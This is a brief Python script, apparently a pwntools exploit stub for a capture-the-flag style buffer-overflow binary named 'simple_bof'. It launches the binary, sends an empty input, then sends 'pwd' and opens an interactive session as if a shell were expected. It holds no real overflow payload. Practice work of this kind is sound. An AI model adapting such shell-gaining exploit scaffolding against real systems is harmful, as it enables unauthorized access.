from pwn import *
# exit(1)
# p = gdb.debug("./bof",'b *0x5555555552d8')
context.log_level='debug'
try:
    p=process("./simple_bof")
    context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
    p.sendlineafter(": ",b"")
    p.sendline(b"pwd")
    p.read()
    p.interactive()
except:
    pass